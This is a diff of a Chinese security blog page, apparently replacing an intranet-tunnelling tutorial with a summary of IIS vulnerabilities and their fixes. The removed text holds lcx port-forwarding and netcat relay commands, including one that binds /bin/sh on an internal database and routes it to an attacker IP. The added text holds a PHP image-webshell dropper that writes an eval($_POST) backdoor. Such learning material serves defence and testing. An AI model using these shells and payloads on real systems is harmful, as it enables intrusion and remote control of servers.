@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>内网渗透--建立隐藏通信隧道 | Beret-81</title>
-  <meta name="keywords" content=" 信息收集、学习记录 ">
-  <meta name="description" content="内网渗透--建立隐藏通信隧道 | Beret-81">
+  <title>IIS 漏洞总结 | Beret-81</title>
+  <meta name="keywords" content=" IIS 漏洞、中间件漏洞 ">
+  <meta name="description" content="IIS 漏洞总结 | Beret-81">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="IIS 漏洞总结 IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 IIS目前只适用于Windows系统，不适用于其他操作系统。  1、文件解析漏洞1.1 目录解析漏洞在 IIS5.x&#x2F;6.0 中，默认会将 *.asp（.asa、.cer、.cdx ）目录下的所有文件当成As">
 <meta property="og:type" content="article">
@@ -500,9 +500,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-内网渗透-建立隐藏通信隧道" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-IIS-漏洞总结" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">内网渗透--建立隐藏通信隧道</h1>
+        <h1 class="article-title">IIS 漏洞总结</h1>
     
     <div class="article-meta">
         
@@ -512,7 +512,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="内网渗透">内网渗透</a>
+            <a  data-rel="漏洞集合">漏洞集合</a>
             
         </span>
         
@@ -520,14 +520,14 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">信息收集、学习记录</a>
+            <a class="color3">IIS 漏洞、中间件漏洞</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-08-11 18:03:36'>2020-02-03 10:36</time>
+            Created At : <time class="date" title='Updated At: 2020-08-21 14:40:40'>2020-08-16 17:03</time>
         
     </div>
     <div class="article-meta">
@@ -549,7 +549,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#内网渗透-建立隐藏通信隧道"><span class="toc-text">内网渗透-建立隐藏通信隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网络层隧道技术"><span class="toc-text">网络层隧道技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#传输层隧道技术"><span class="toc-text">传输层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、lcx-端口转发"><span class="toc-text">1、lcx 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-内网端口转发"><span class="toc-text">1.1 内网端口转发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-本地端口映射"><span class="toc-text">1.2 本地端口映射</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、NC-代理转发"><span class="toc-text">2、NC 代理转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#应用层隧道技术"><span class="toc-text">应用层隧道技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、ssh-代理转发"><span class="toc-text">1、ssh 代理转发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1本地转发"><span class="toc-text">1.1本地转发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOCKS-代理"><span class="toc-text">SOCKS 代理</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IIS-漏洞总结"><span class="toc-text">IIS 漏洞总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1、文件解析漏洞"><span class="toc-text">1、文件解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-目录解析漏洞"><span class="toc-text">1.1 目录解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-文件名解析漏洞"><span class="toc-text">1.2 文件名解析漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-畸形解析漏洞"><span class="toc-text">1.3 畸形解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、IIS-短文件漏洞"><span class="toc-text">2、IIS 短文件漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、PUT-任意文件写入"><span class="toc-text">3、PUT 任意文件写入</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -565,34 +565,76 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="内网渗透-建立隐藏通信隧道"><a href="#内网渗透-建立隐藏通信隧道" class="headerlink" title="内网渗透-建立隐藏通信隧道"></a>内网渗透-建立隐藏通信隧道</h1><h2 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h2><h2 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h2><blockquote>
-<p>传输层技术包括TCP 隧道、UDP 隧道、和常见的端口转发等。在渗透测试中，如果内网防火墙阻止了对指定端口的访问，在获得目标机器的权限后，可以使用IPTABLES打开指定端口。</p>
+        <h1 id="IIS-漏洞总结"><a href="#IIS-漏洞总结" class="headerlink" title="IIS 漏洞总结"></a>IIS 漏洞总结</h1><blockquote>
+<p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。 IIS目前只适用于Windows系统，不适用于其他操作系统。</p>
 </blockquote>
-<h3 id="1、lcx-端口转发"><a href="#1、lcx-端口转发" class="headerlink" title="1、lcx 端口转发"></a>1、lcx 端口转发</h3><blockquote>
-<p>LCX是一个基于socket 套接字实现的端口转发工具。windows版本为lcx.exe，Linux 版本为 portmap。</p>
-</blockquote>
-<h4 id="1-1-内网端口转发"><a href="#1-1-内网端口转发" class="headerlink" title="1.1 内网端口转发"></a>1.1 内网端口转发</h4><pre><code>在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网vps的4444 端口上
-lcx.exe -slave 公网主机IP  4444 127.0.0.1 3389
-在vps 上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555 端口上。
-lcx.exe -listen 4444 5555
-此时，我们使用 mstsc 连接 &lt;公网IP地址&gt;：5555，即可访问目标服务器的3389端口。</code></pre><h4 id="1-2-本地端口映射"><a href="#1-2-本地端口映射" class="headerlink" title="1.2 本地端口映射"></a>1.2 本地端口映射</h4><pre><code>如果目标主机的部分端口（如3389）被防火墙拦截时，我们可以通过目标主机相应端口的数据传到防火墙允许的其他端口（如53）。
-在目标主机上执行如下命令，就可以直接从远程桌面连接到目标主机的53端口了。
-lcx.exe -tran &lt;目标主机IP地址&gt; 3389</code></pre><h3 id="2、NC-代理转发"><a href="#2、NC-代理转发" class="headerlink" title="2、NC 代理转发"></a>2、NC 代理转发</h3><pre><code>通过边界机作代理,使kali与数据库通信,访问内网数据库：
+<h1 id="1、文件解析漏洞"><a href="#1、文件解析漏洞" class="headerlink" title="1、文件解析漏洞"></a>1、文件解析漏洞</h1><h2 id="1-1-目录解析漏洞"><a href="#1-1-目录解析漏洞" class="headerlink" title="1.1 目录解析漏洞"></a>1.1 目录解析漏洞</h2><p>在 IIS5.x/6.0 中，默认会将 <em>*.asp（</em>.asa、<em>.cer、</em>.cdx ）目录下的所有文件当成Asp解析。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200329142648132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt="">   </p>
+<p><img src="https://img-blog.csdnimg.cn/20200329142912889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>从应用配置中可以看出，他们都是调用了asp.dll进行的解析。<br><img src="https://img-blog.csdnimg.cn/20200329142938674.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200329142946226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<h3 id="1-2-文件名解析漏洞"><a href="#1-2-文件名解析漏洞" class="headerlink" title="1.2 文件名解析漏洞"></a>1.2 文件名解析漏洞</h3><p>在 IIS5.x/6.0 中，默认会将 <em>*.asp;（</em>.asa;.jpg、*.cer;.jpg） 这种格式的文件名，当成Asp解析，是因为服务器默认不解析; 号及其后面的内容，相当于截断。<br><img src="https://img-blog.csdnimg.cn/2020032914503617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<pre><code>漏洞修复：
 
-攻击机：192.136.100.111 (公网IP)
-WEB边界机：192.168.1.100 10.10.10.100
-内网数据库：10.10.10.200
+由于微软并不认为这是一个漏洞，也没有推出IIS 6.0的补丁，因此漏洞需要自己修复。
 
-攻击机执行:
-nc -lvp 3333
-数据库执行:
-nc -lvp 3333 -e /bin/sh
-web服务器执行：
-nc -v 192.136.100.111 3333 -c &quot;nc -v 10.10.10.200 3333&quot;</code></pre><h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><h3 id="1、ssh-代理转发"><a href="#1、ssh-代理转发" class="headerlink" title="1、ssh 代理转发"></a>1、ssh 代理转发</h3><h4 id="1-1本地转发"><a href="#1-1本地转发" class="headerlink" title="1.1本地转发"></a>1.1本地转发</h4><pre><code>通过边界机作代理,使kali与数据库通信,访问内网数据库：
+限制上传目录执行权限，不允许执行脚本。
+不允许新建目录。
+上传的文件需经过重命名(时间戳+随机数+.jpg等)
+注：如果攻击者可以控制上传目录，那么攻击者依然可以利用该漏洞。</code></pre><h3 id="1-3-畸形解析漏洞"><a href="#1-3-畸形解析漏洞" class="headerlink" title="1.3 畸形解析漏洞"></a>1.3 畸形解析漏洞</h3><p>IIS7.x版本 在Fast-CGI运行模式下,在任意文件，例:1.jpg后面加上/.php，会将1.jpg 解析为php文件。</p>
+<p>我们可以上传图片马，然后在后面加上.php 或者1.php。可以被解析成PHP文件。<br>或者我们可以在图片马test.jpg中写入下面的代码：</p>
+<pre><code>&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[pass])?&gt;&apos;)?&gt;</code></pre><p>上传成功后，直接访问/upload/test.jpg/.php，此时test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会发现在 /upload 目录下创建了一个一句话木马文件 shell.php 。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200329145243481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>漏洞修复：<br>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序<br><img src="https://img-blog.csdnimg.cn/20200329145405754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>修复后：<br><img src="https://img-blog.csdnimg.cn/20200329145828764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p><img src="https://img-blog.csdnimg.cn/20200329145843318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>或者是显示NO input file specified:<br><img src="https://img-blog.csdnimg.cn/20200329150114518.png" alt=""></p>
+<hr>
+<h2 id="2、IIS-短文件漏洞"><a href="#2、IIS-短文件漏洞" class="headerlink" title="2、IIS 短文件漏洞"></a>2、IIS 短文件漏洞</h2><p>Windows 以 8.3 格式生成与 MS-DOS 兼容的(短)文件名，以允许基于 MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入”dir /x”即可看到短 文件名的效果。</p>
+<pre><code>使用工具检测：
+https://github.com/lijiejie/IIS_shortname_Scanner
+https://github.com/irsdl/IIS-ShortName-Scanner</code></pre><p>修复前：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200329150332318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>当访问构造的某个存在的短文件名，会返回404<br><img src="https://img-blog.csdnimg.cn/20200329150353404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>修复后：<br><img src="https://img-blog.csdnimg.cn/2020032915040683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>修复前：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200329150444629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p><img src="https://img-blog.csdnimg.cn/20200329150450861.png" alt=""></p>
+<p>修复后：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200329150505400.png" alt=""></p>
+<p><img src="https://img-blog.csdnimg.cn/20200329150510867.png" alt=""></p>
+<p>不同版本的IIS，返回的信息如下：<br><img src="https://img-blog.csdnimg.cn/20200329151627797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<pre><code>修复方法：
+IIS短文件漏洞局限性
 
-攻击机：192.136.100.111 (公网IP)
-WEB边界机：192.168.1.100 10.10.10.100
-内网数据库：10.10.10.200</code></pre><h2 id="SOCKS-代理"><a href="#SOCKS-代理" class="headerlink" title="SOCKS 代理"></a>SOCKS 代理</h2>
+如果文件名本身太短也是无法猜解的;
+此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解;
+如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配;
+如果文件夹名前6位字符带点&quot;.&quot;，扫描程序会认为是文件而不是文件夹，最终出现误报;
+不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。
+
+从CMD命令关闭NTFS 8.3文件格式的支持 
+Windows Server 2003: (1代表关闭，0代表开启) 
+关闭该功能:fsutil behavior set disable8dot3 1</code></pre><p><img src="https://img-blog.csdnimg.cn/20200329150540836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""> </p>
+<pre><code>Windows Server 2008 R2:
+
+查询是否开启短文件名功能:
+fsutil 8dot3name query 
+关闭该功能:
+fsutil 8dot3name set 1 不同系统关闭命令稍有区别，该功能默认是开启的. 2)
+或从修改注册表关闭NTFS 8.3文件格式的支持 
+快捷键Win+R打开命令窗口，输入regedit打开注册表窗口 
+找到路径:
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，
+将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件 名格式 </code></pre><p><img src="https://img-blog.csdnimg.cn/20200329150737904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<pre><code>以上两种方式修改完成后，均需要重启系统生效。
+Note:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。
+例:将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到c:\www。</code></pre><h2 id="3、PUT-任意文件写入"><a href="#3、PUT-任意文件写入" class="headerlink" title="3、PUT 任意文件写入"></a>3、PUT 任意文件写入</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入。<br><img src="https://img-blog.csdnimg.cn/20200329151152313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p><img src="https://img-blog.csdnimg.cn/20200329151204570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>开启WebDAV 后：<br><img src="https://img-blog.csdnimg.cn/20200329151216379.png" alt=""></p>
+<p>开启写入权限后，可以成功写入：<br><img src="https://img-blog.csdnimg.cn/20200329151229304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<p>关闭后WebDAV 、写入权限之后：<br><img src="https://img-blog.csdnimg.cn/20200329151239891.png" alt=""><br><img src="https://img-blog.csdnimg.cn/2020032915124591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjkxODc3MQ==,size_16,color_FFFFFF,t_70" alt=""></p>
+<pre><code>漏洞修复：
+关闭WebDAV 和 写权限</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源。 </span>
     </div>
